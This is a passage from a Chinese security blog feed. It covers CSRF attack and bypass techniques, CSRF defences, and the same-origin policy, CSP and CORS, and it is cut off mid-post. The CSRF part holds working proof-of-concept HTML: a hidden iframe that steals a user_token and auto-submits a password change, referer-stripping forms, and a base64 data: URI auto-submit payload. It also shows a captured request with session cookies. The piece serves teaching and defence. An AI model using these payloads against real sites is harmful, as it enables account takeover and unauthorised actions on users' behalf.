class="comment">//zone.wooyun.org/index.php?do=edit&amp;act=delcomment&amp;fun=ajax&amp;id=311946</span></span><br></pre></td></tr></table></figure><p>2、用户在快速登录(qq、微信)之后,网站要求重新填写用户名、密码、邮箱等信息</p><p>3、网站个人后台修改密码时候无验证码、旧密码、表单token认证等操作</p><p>4、敏感操作:</p><p>刷粉丝、花钱购买图书章节阅读权限、恶意打赏、恶意刷评论</p><h4 id="利用payload"><a href="#利用payload" class="headerlink" title="利用payload"></a>利用payload</h4><p>1、get型–构造url</p><p>2、post型–burp可以直接生成poc</p><p>3、结合存储型xss,存放我们的csrfpoc</p><h4 id="绕过思路"><a href="#绕过思路" class="headerlink" title="绕过思路"></a>绕过思路</h4><h5 id="1、Token绕过"><a href="#1、Token绕过" class="headerlink" title="1、Token绕过"></a>1、Token绕过</h5><p>页面表单会生成一个token,执行操作的时候需要带上token</p><ul><li><p>结合xss–将我们构造好的代码插入目标网站,获取用户当前的cookie、token等信息,发送到我们的网站</p><ul><li>attach()函数用于获取user_token</li><li>一个iframe标签用于隐藏访问获取一个Token</li><li>一个form表单用于将修改的密码与Token进行提交数据库</li></ul><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line"><span class="function">function <span class="title">attack</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    document.getElementsByName(<span class="string">&#x27;user_token&#x27;</span>)[<span class="number">0</span>].<span class="keyword">value</span>=document.getElementById(<span class="string">&quot;hack&quot;</span>).contentWindow.document.getElementsByName(<span class="string">&#x27;user_token&#x27;</span>)[<span class="number">0</span>].<span class="keyword">value</span>;</span><br><span class="line">    document.getElementById(<span class="string">&quot;transfer&quot;</span>).submit();</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;iframe src=<span class="string">&quot;http://192.168.0.1/xxx&quot;</span> id=<span class="string">&quot;hack&quot;</span> border=<span class="string">&quot;0&quot;</span> style=<span class="string">&quot;display:none;&quot;</span>&gt;</span><br><span class="line">&lt;/iframe&gt;</span><br><span class="line">&lt;body onload=<span class="string">&quot;attack()&quot;</span>&gt;</span><br><span class="line">&lt;form method=<span class="string">&quot;GET&quot;</span> id=<span class="string">&quot;transfer&quot;</span> action=<span class="string">&quot;http://192.168.0.109/xxx&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;password_new&quot;</span> <span class="keyword">value</span>=<span class="string">&quot;password&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;password_conf&quot;</span> <span class="keyword">value</span>=<span class="string">&quot;password&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;user_token&quot;</span> <span class="keyword">value</span>=<span class="string">&quot;&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;Change&quot;</span> <span class="keyword">value</span>=<span class="string">&quot;Change&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure></li><li><p>token在url中可见+请求包的referer字段</p><p>让用户访问我们自己的网站,从用户的请求包中的referer字段拿到用户的token</p></li><li><p>使用JSONP跨域去请求Token</p><ul><li>前提<ul><li>请求是不检查Referer</li><li>使用JSONP去跨域生成Token</li><li>回传参数可以得出，默认为callback</li><li>能够fuzz出一定回调参数的值</li></ul></li><li>利用:构造callback的值,发送JSONP请求,获取Token,进行表单构造利用,引诱点击<ul><li>▲ Token的值也可能与其他参数有关</li></ul></li></ul></li></ul><h5 id="2、referer绕过"><a href="#2、referer绕过" class="headerlink" title="2、referer绕过"></a>2、referer绕过</h5><p>根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。在通常情况下，访问一个安全受限页面的请求来自于同一个网站，比如需要访问<code> http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory</code>，用户必须先登陆 bank.example，然后通过点击页面上的按钮来触发转账事件。这时，该转帐请求的 Referer 值就会是转账按钮所在的页面的 URL，通常是以 bank.example 域名开头的地址。而如果黑客要对银行网站实施 CSRF 攻击，他只能在他自己的网站构造请求，当用户通过黑客的网站发送请求到银行时，该请求的 Referer 是指向黑客自己的网站。因此，要防御 CSRF 攻击，银行网站只需要对于每一个转账请求验证其 Referer 值，如果是以 bank.example 开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果 Referer 是其他网站的话，则有可能是黑客的 CSRF 攻击，拒绝该请求</p><ul><li><p>目标站判断了referer是否正确,但是对无referer的情况没有作出判断,逻辑上出现错误</p><ul><li><p>csrfpoc使用html代码</p><p><code>&lt;meta name=&quot;referrer&quot; content=&quot;never&quot;&gt;</code></p><p>比如</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;meta name=<span class="string">&quot;referrer&quot;</span> content=<span class="string">&quot;never&quot;</span>&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)&lt;/script&gt;  &lt;!-- 实现浏览器页面不刷新修改url链接 --&gt;</span><br><span class="line">    &lt;form action=<span class="string">&quot;http://www.baidu.com/setProfile&quot;</span> method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">      &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;nickname&quot;</span> <span class="keyword">value</span>=<span class="string">&quot;new22&quot;</span> /&gt;</span><br><span class="line">      &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;email&quot;</span> <span class="keyword">value</span>=<span class="string">&quot;1&amp;#64;1&amp;#46;com&quot;</span> /&gt;</span><br><span class="line">      &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;team&quot;</span> <span class="keyword">value</span>=<span class="string">&quot;new22&quot;</span> /&gt;</span><br><span class="line">      &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;address&quot;</span> <span class="keyword">value</span>=<span class="string">&quot;new33&quot;</span> /&gt;</span><br><span class="line">      &lt;input type=<span class="string">&quot;submit&quot;</span> <span class="keyword">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></li><li><p>用户可以设置浏览器不传递referer</p></li><li><p>使用协议绕过</p><p>利用<code>ftp://,http://,https://,file://,javascript:,data:</code>这个时候浏览器地址栏是<code>file://</code>开头的，如果这个HTML页面向任何http站点提交请求的话，这些请求的Referer都是空的。</p><ul><li><p>利用data:协议</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;iframe src=<span class="string">&quot;data:text/html;base64,PGZvcm0gbWV0aG9kPXBvc3QgYWN0aW9uPWh0dHA6Ly9hLmIuY29tL2Q+PGlucHV0IHR5cGU9dGV4dCBuYW1lPSdpZCcgdmFsdWU9JzEyMycvPjwvZm9ybT48c2NyaXB0PmRvY3VtZW50LmZvcm1zWzBdLnN1Ym1pdCgpOzwvc2NyaXB0Pg==&quot;</span>&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">payload:</span><br><span class="line">&lt;form method=post action=http:<span class="comment">//a.b.com/d&gt;&lt;input type=text name=&#x27;id&#x27; value=&#x27;123&#x27;/&gt;&lt;/form&gt;&lt;script&gt;document.forms[0].submit();&lt;/script&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>利用https协议</p><p>https向http跳转的时候Referer为空</p><p>payload在https环境下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src&#x3D;&quot;https:&#x2F;&#x2F;xxxxx.xxxxx&#x2F;attack.php&quot;&gt;</span><br></pre></td></tr></table></figure><p> attack.php写上CSRF攻击代码</p></li></ul></li><li><p>Referrer Policy</p><p>隐藏referrer</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;steady.com&quot; referrerpolicy&#x3D;&quot;no-referrer&quot;&gt; </span><br></pre></td></tr></table></figure></li><li><p>IE6、7下使用window.location.href=url、window.open进行界面的跳转，会丢失Referer。</p></li></ul></li><li><p>绕过后台逻辑判断</p><p>可以在我们的恶意url中添加上后台指定的url(把对方指定的url名字变成我们的文件夹名字)</p></li></ul><h5 id="3、jsonp跨域劫持"><a href="#3、jsonp跨域劫持" class="headerlink" title="3、jsonp跨域劫持"></a>3、jsonp跨域劫持</h5><p>通过发起jsonp请求，拿到服务端发回的token</p><h4 id="防御思路"><a href="#防御思路" class="headerlink" title="防御思路"></a>防御思路</h4><h5 id="1、验证码"><a href="#1、验证码" class="headerlink" title="1、验证码"></a>1、验证码</h5><p>优点：</p><p>验证码类型日新月异,各种技术层出不穷。可以很好的防止CSRF</p><p>缺点：</p><p>无法大量部署。影响用户体验。不能每一步都加上验证码。</p><h5 id="2、二次验证"><a href="#2、二次验证" class="headerlink" title="2、二次验证"></a>2、二次验证</h5><p><strong>检查请求来源</strong></p><p>优点:</p><p>检查请求来源的主要方式为 Referer、Origin，就是 HTTP 请求头的那个（两者比较类似，下面仅以 Referer 为例）。Referer 最常见的应用实际上是防盗链。比如我的博客就有。防盗链利用了 referer 检查请求的来源，同样也可以利用来防御 CSRF。</p><p>缺点:</p><ul><li>用户为了保护隐私，自己阻止了浏览器发送 referer</li><li>攻击者可以让自己的页面不发送 referer：<meta name="referer" content="never">这个代码告诉浏览器，所有从当前页面中发起的请求都不要携带 referer</li><li>HTTPS 转为 HTTP 的时候，浏览器出于安全的考虑，不发送 referer。例如网站中有<meta name="referrer" content="default">，如果当前页面使用的是 HTTPS，而正要加载的资源使用的是 HTTP，则将 HTTP header 中的 referer 置空。但是如果是 content=”always” 的话，浏览器会把 HTTPS 的 referer 带给 HTTP 的页面</li><li>如果添加referer并且目标页面token是get形式发送(在url中可见),我们伪造一个页面让别人从目标站来访问我们自己的页面,在请求头中的referer能够带上token,导致token泄漏</li></ul><h5 id="3、Token"><a href="#3、Token" class="headerlink" title="3、Token"></a>3、Token</h5><p>那么我们可以要求所有的用户请求都携带一个CSRF攻击者无法获取到的Token。服务器通过校验请求是否携带正确的Token，来把正常的请求和攻击的请求区分开，也可以防范CSRF的攻击。</p><p>CSRF Token的防护策略分为三个步骤：</p><p>1.将CSRF Token输出到页面中</p><p>Token不能放在cookie中，容易被获取，最好放在服务端到session中。之后在每次页面加载时，使用JS遍历整个DOM树，对于DOM中所有的a和form标签后加入Token。这样可以解决大部分的请求，但是对于在页面加载之后动态生成的HTML代码，这种方法就没有作用，还需要程序员在编码时手动添加Token。</p><p>2.页面提交的请求携带这个Token</p><p>对于GET请求，Token将附在请求地址之后。</p><p>对于 POST 请求来说，要在 form 的最后加上。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type&#x3D;”hidden” name&#x3D;”csrftoken” value&#x3D;”tokenvalue”&#x2F;&gt;</span><br></pre></td></tr></table></figure><p>3.服务器验证Token是否正确</p><p>Token的分布式校验</p><p>Session默认存储在单机服务器内存中，因此在分布式环境下同一个用户发送的多次HTTP请求可能会先后落到不同的服务器上，导致后面发起的HTTP请求无法拿到之前的HTTP请求存储在服务器中的Session数据，从而使得Session机制在分布式环境下失效，因此在分布式集群中CSRF Token需要存储在Redis之类的公共存储空间。为此解决办法是Token是一个计算出来的结果，而非随机生成的字符串。这样在校验时无需再去读取存储的Token，只用再次计算一次即可。</p><h5 id="4、同源检测"><a href="#4、同源检测" class="headerlink" title="4、同源检测"></a>4、同源检测</h5><p>服务器可以通过解析这两个Header–Origin Header、Referer Header中的域名，确定请求的来源域。</p><p>注意：</p><p>IE11同源策略： IE 11 不会在跨站CORS请求上添加Origin标头，Referer头将仍然是唯一的标识。</p><p>302重定向： 在302重定向之后Origin不包含在重定向的请求中，因为Origin可能会被认为是其他来源的敏感信息。对于302重定向的情况来说都是定向到新的服务器上的URL，因此浏览器不想将Origin泄漏到新的服务器上。</p><p>Referer：对于Ajax请求，图片和script等资源请求，Referer为发起请求的页面地址。对于页面跳转，Referer为打开页面历史记录的前一个页面地址。因此我们使用Referer中链接的Origin部分可以得知请求的来源域名。</p><p>如果攻击者有权限在本域发布评论（含链接、图片等，统称UGC），那么它可以直接在本域发起攻击，这种情况下同源策略无法达到防护的作用。</p><h5 id="5、双重cookie"><a href="#5、双重cookie" class="headerlink" title="5、双重cookie"></a>5、双重cookie</h5><p>双重Cookie采用以下流程：</p><ul><li>在用户访问网站页面时，向请求域名注入一个Cookie，内容为随机字符串（例如<code>csrfcookie=v8g9e4ksfhw</code>）。</li><li>在前端向后端发起请求时，取出Cookie，并添加到URL的参数中（接上例<code>POST https://www.a.com/comment?csrfcookie=v8g9e4ksfhw</code>）。</li><li>后端接口验证Cookie中的字段与URL参数中的字段是否一致，不一致则拒绝。</li></ul><h5 id="6、Samesite-Cookie属性"><a href="#6、Samesite-Cookie属性" class="headerlink" title="6、Samesite Cookie属性"></a>6、Samesite Cookie属性</h5><p>Google起草了一份草案来改进HTTP协议，那就是为Set-Cookie响应头新增Samesite属性，它用来标明这个 Cookie是个“同站 Cookie”，同站Cookie只能作为第一方Cookie，不能作为第三方Cookie，Samesite 有两个属性值，分别是 Strict 和 Lax。</p><p>Samesite=Strict</p><p>严格模式，表明这个 Cookie 在任何情况下都不可能作为第三方 Cookie，绝无例外。</p><p>淘宝网站用来识别用户登录与否的 Cookie 被设置成了 Samesite=Strict，那么用户从百度搜索页面甚至天猫页面的链接点击进入淘宝后，淘宝都不会是登录状态，因为淘宝的服务器不会接受到那个 Cookie，其它网站发起的对淘宝的任意请求都不会带上那个 Cookie。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: foo&#x3D;1; Samesite&#x3D;Strict</span><br><span class="line">Set-Cookie: bar&#x3D;2; Samesite&#x3D;Lax</span><br><span class="line">Set-Cookie: baz&#x3D;3</span><br></pre></td></tr></table></figure><p>在 <a href="http://a.com/">a.com</a> 下发起对 <a href="http://b.com/">b.com</a> 的任意请求，foo 这个 Cookie 都不会被包含在 Cookie 请求头中，但 bar 会。</p><p>Samesite=Lax</p><p>宽松模式，比 Strict 放宽了点限制：假如这个请求是这种请求（改变了当前页面或者打开了新页面）且同时是个GET请求，则这个Cookie可以作为第三方Cookie。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: foo&#x3D;1; Samesite&#x3D;Strict</span><br><span class="line">Set-Cookie: bar&#x3D;2; Samesite&#x3D;Lax</span><br><span class="line">Set-Cookie: baz&#x3D;3</span><br></pre></td></tr></table></figure><p>当用户从 <a href="http://a.com/">a.com</a> 点击链接进入 <a href="http://b.com/">b.com</a> 时，foo 这个 Cookie 不会被包含在 Cookie 请求头中，但 bar 和 baz 会，也就是说用户在不同网站之间通过链接跳转是不受影响了。但假如这个请求是从 <a href="http://a.com/">a.com</a> 发起的对 <a href="http://b.com/">b.com</a> 的异步请求，或者页面跳转是通过表单的 post 提交触发的，则bar也不会发送。</p><p>该设置有个缺点，topic.a.com下的Cookie，并不能使用a.com下种植的SamesiteCookie。这就导致了当我们网站有多个子域名时，不能使用SamesiteCookie在主域名存储用户登录信息。每个子域名都需要用户重新登录一次。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;CSRF漏洞总结&quot;&gt;&lt;a href=&quot;#CSRF漏洞总结&quot; class=&quot;headerlink&quot; title=&quot;CSRF漏洞总结&quot;&gt;&lt;/a&gt;CSRF漏洞总结&lt;/h3&gt;&lt;h4 id=&quot;Gmail的CSRF漏洞&quot;&gt;&lt;a href=&quot;#Gmail的CSRF漏洞&quot; cla</summary>
      
    
    
    
    <category term="前端安全" scheme="http://s1eady.top/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="OWSP-TOP10" scheme="http://s1eady.top/tags/OWSP-TOP10/"/>
    
  </entry>
  
  <entry>
    <title>同源策略与CSP</title>
    <link href="http://s1eady.top/2019/06/22/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E4%B8%8ECSP/"/>
    <id>http://s1eady.top/2019/06/22/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E4%B8%8ECSP/</id>
    <published>2019-06-22T01:20:56.000Z</published>
    <updated>2020-10-07T02:20:41.311Z</updated>
    
    <content type="html"><![CDATA[<h2 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h2><h5 id="什么是跨域"><a href="#什么是跨域" class="headerlink" title="什么是跨域?"></a>什么是跨域?</h5><p>域:域是windows网络操作系统的逻辑组织单元,也是internet的逻辑组织单元.他是安全边界</p><p>只有域的所有者才能有权利去管理或者访问域内部的资源,若其他域要访问或者管理,则需要该域赋予其他域的相关权限。</p><p>网页跨域是指一个域下的文档或脚本试图去请求另一个域下的资源。</p><h5 id="同源策略-1"><a href="#同源策略-1" class="headerlink" title="同源策略"></a>同源策略</h5><p>同源是指域名、协议、端口相同</p><p>浏览器的同源策略主要有两个:</p><p>DOM的同源策略:禁止对不同源页面的DOM元素进行操作,主要是在inframe标签加载跨域页面出现</p><p>XmlHttpRequests同源策略:禁止XHR对象对不同的源地址发起请求</p><p>存储在浏览器中的数据，如localStroage、Cooke和IndexedDB不能通过脚本跨域访问</p><h5 id="Dom-同源策略"><a href="#Dom-同源策略" class="headerlink" title="Dom 同源策略"></a>Dom 同源策略</h5><p>Dom同源策略主要是防止你通过iframe标签引入恶意的网页,该网页能够窃取当前网站的cookie等重要信息,之所以是Dom同源策略,就是我们可以操作Dom来拿到重要信息,比如操作Dom元素拿到目标网站中的input标签中的内容，内容可能是密码、账号。</p><p>我们来看一个例子:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">   &lt;head&gt;</span><br><span class="line">        &lt;title&gt;Siam - Dom同源策略&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;&#x2F;head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;iframe src&#x3D;&quot;http:&#x2F;&#x2F;www.alipay.com&quot;&gt;</span><br><span class="line">    &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="http://www.steady.com网站中嵌入了iframe标签引入了支付宝的网站.执行的时候我们发现,他拒绝了支付宝页面的展示,原因是没有设置请求头---x-frame-options,主要原因就是不同源(sameorigin)/">www.steady.com网站中嵌入了iframe标签引入了支付宝的网站.执行的时候我们发现，他拒绝了支付宝页面的展示,原因是没有设置请求头---X-Frame-Options,主要原因就是不同源(sameorigin)</a></p><p><code>X-Frame-Options</code> 是一个HTTP标头（header），用来告诉浏览器这个网页是否可以放在iFrame内。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">X-Frame-Options: DENY     &#x2F;&#x2F; 不允许iframe</span><br><span class="line">X-Frame-Options: SAMEORIGIN   &#x2F;&#x2F; 只允许同源的网站iframe</span><br><span class="line">X-Frame-Options: ALLOW-FROM [http:&#x2F;&#x2F;yancoo.cn&#x2F;](https:&#x2F;&#x2F;links.jianshu.com&#x2F;go?to&#x3D;http%3A%2F%2Fyancoo.cn%2F)  &#x2F;&#x2F; 只允许指定网站iframe</span><br></pre></td></tr></table></figure><h5 id="XMLHttpRequest-同源策略"><a href="#XMLHttpRequest-同源策略" class="headerlink" title="XMLHttpRequest 同源策略"></a>XMLHttpRequest 同源策略</h5><p>XHR主要是防止获取用户cookie,防止攻击者进行跨站请求伪造</p><p>跨站请求原理:</p><p>1、用户登陆网站A,先要填写用户名、密码等cookie信息.然后信息保存在浏览器中</p><p>2、用户访问恶意网站B,(不知情的情况下)执行恶意网站的某些操作,而该操作会带上用户在浏览器端的cookie信息</p><p>去执行一些非法操作</p><p>3、站点A根据请求所带的cookie,判断该用户为合法的A用户,成功实现攻击者的目的</p><h5 id="同源检测"><a href="#同源检测" class="headerlink" title="同源检测"></a>同源检测</h5><h6 id="Origin-Header"><a href="#Origin-Header" class="headerlink" title="Origin Header"></a>Origin Header</h6><p>具体流程</p><ul><li>当一个链接或者XMLHttpRequest去请求跨域操作，浏览器事实上的确向目标服务器发起了连接请求，并且携带这origin。</li></ul><p>请求首部字段 Origin 指示了请求来自于哪个站点。该字段仅指示服务器名称，并不包含任何路径信息。除了不包含路径信息（不包含path及query），该字段与 Referer 首部字段相似。</p><h6 id="Referer-Header"><a href="#Referer-Header" class="headerlink" title="Referer Header"></a>Referer Header</h6><p>具体流程</p><ul><li>在发起请求前，调用window.localtion获取window.location.href获取当前地址栏中的请求地址</li><li>将该地址附加到referrer域中</li></ul><p>判断请求头中的Referer字段，比如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /pheapi/article/dir/<span class="number">89489609</span> HTTP/<span class="number">1.1</span></span><br><span class="line">Host: blog.csdn.net</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Macintosh; Intel Mac OS X <span class="number">10.15</span>; rv:<span class="number">81.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">81.0</span></span><br><span class="line">Accept: application/json, text/javascript, */*; q=<span class="number">0.01</span></span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.8</span>,zh-TW;q=<span class="number">0.7</span>,zh-HK;q=<span class="number">0.5</span>,en-US;q=<span class="number">0.3</span>,en;q=<span class="number">0.2</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https://blog.csdn.net/qq_36119192/article/details/<span class="number">89489609</span></span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">X-Tingyun-Id: im-pGljNfnc;r=<span class="number">901833252</span></span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>以上场景出现在用户从<code>https://blog.csdn.net/qq_36119192/article/details/89489609</code>访问<code>/pheapi/article/dir/89489609</code>，目的页面可以通过请求头中的referer字段来判断是否是跨域请求。</p><h6 id="两者区别"><a href="#两者区别" class="headerlink" title="两者区别"></a>两者区别</h6><p>origin只有发生跨域请求或者同域的post请求时候才会有。</p><p>referer不论何种情况下，只要浏览器能获取到请求源都会携带，携带着url的很多参数信息，而这些信息实际上是隐私的，但是外部网站都可以看到这些数据。</p><p>补天平台登录请求头</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /user/sign-in?next=https://www.butian.net/Home/login/loginBack HTTP/1.1</span><br><span class="line">Host: user.butian.net</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Macintosh; Intel Mac OS X <span class="number">10.15</span>; rv:<span class="number">81.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">81.0</span></span><br><span class="line">Accept: application/json</span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.8</span>,zh-TW;q=<span class="number">0.7</span>,zh-HK;q=<span class="number">0.5</span>,en-US;q=<span class="number">0.3</span>,en;q=<span class="number">0.2</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/json; charset=UTF<span class="number">-8</span></span><br><span class="line">Content-Length: <span class="number">208</span></span><br><span class="line">//可以看到referer没有带上path和query</span><br><span class="line">Origin: https://user.butian.net</span><br><span class="line">Connection: close</span><br><span class="line">Referer: https://user.butian.net/user/sign-in?next=https://www.butian.net/login.html&amp;style=1</span><br><span class="line">Cookie: next=<span class="string">&quot;https%3A//www.butian.net/login.html&quot;</span>; __q__=<span class="number">1601903202954</span>; csrf_token=<span class="number">1601906836</span><span class="comment">##158ab5b128d3781965424a7ece2f6cbe318bcf8f; style=1; User-Center=b8a5b564-f158-4af1-977d-6adf7105c2c9; btlc_ba52447ea424004a7da412b344e5e41a=e063dd212b16f71c690e97fa9aeaafc404be29448327bf57a72e50f675893d27</span></span><br></pre></td></tr></table></figure><h5 id="跨域的解决方法"><a href="#跨域的解决方法" class="headerlink" title="跨域的解决方法"></a>跨域的解决方法</h5><h5 id="CORS-跨域解决"><a href="#CORS-跨域解决" class="headerlink" title="CORS 跨域解决"></a>CORS 跨域解决</h5><p>它允许浏览器向跨源服务器，发出<code>XMLHttpRequest</code>请求，从而克服了AJAX只能同源使用的限制。</p><p>实现CORS通信的关键是服务器。只要服务器实现了CORS接口，就可以跨源通信。CORS的请求操作由浏览器自动执行,关键就是服务端的配置,来检测是否允许客户端进行访问。</p><p>CORS的原理:</p><p>使用http自定义头,请求头带上客户端的信息,服务端进行验证,返回响应信息告诉客户端目标资源是否允许被访问</p><h5 id="两种请求"><a href="#两种请求" class="headerlink" title="两种请求"></a>两种请求</h5><h6 id="简单请求"><a href="#简单请求" class="headerlink" title="简单请求"></a>简单请求</h6><p>必须<code>同时满足</code>以下两个条件的请求，才是简单请求</p><p>请求方法只能是在以下三种之中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET</span><br><span class="line">POST</span><br><span class="line">HEAD</span><br></pre></td></tr></table></figure><p>HTTP的头信息不超出以下几种字段：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Accept</span><br><span class="line">Accept-Language</span><br><span class="line">Content-Language</span><br><span class="line">Last-Event-ID</span><br><span class="line">Content-Type 只限于三个值 application&#x2F;x-www-form-urlencoded、multipart&#x2F;form-data、text&#x2F;plain</span><br></pre></td></tr></table></figure><p>凡是不同时满足上面两个条件，就属于非简单请求。</p><h6 id="非简单请求"><a href="#非简单请求" class="headerlink" title="非简单请求"></a>非简单请求</h6><p>在发送真正请求之前，会先发送一次<code>预检</code>请求，来判断服务端是否支持非简单请求的类方法。预检通过之后，浏览器会再次使用<code>真实请求方法</code>发起请求</p><p>“预检”请求用的请求方法是<code>OPTIONS</code>，表示这个请求是用来询问的。头信息里面，关键字段是<code>Origin</code>，表示请求来自哪个源。</p><p>除了<code>Origin</code>字段，”预检”请求的头信息包括两个特殊字段。</p><ul><li><p>Access-Control-Request-Method</p><p>该字段是必须的，用来列出浏览器的CORS请求会用到哪些HTTP方法，上例是<code>PUT</code>。</p></li><li><p>Access-Control-Request-Headers</p><p>该字段是一个逗号分隔的字符串，指定浏览器CORS请求会额外发送的头信息字段，上例是<code>X-Custom-Header</code>。</p></li></ul><h5 id="三个与CORS请求相关的字段"><a href="#三个与CORS请求相关的字段" class="headerlink" title="三个与CORS请求相关的字段"></a>三个与CORS请求相关的字段</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: http://api.bob.com</span><br><span class="line">Access-Control-Allow-Credentials: true</span><br><span class="line">Access-Control-Expose-Headers: FooBar</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br></pre></td></tr></table></figure><h6 id="Access-Control-Allow-Origin"><a href="#Access-Control-Allow-Origin" class="headerlink" 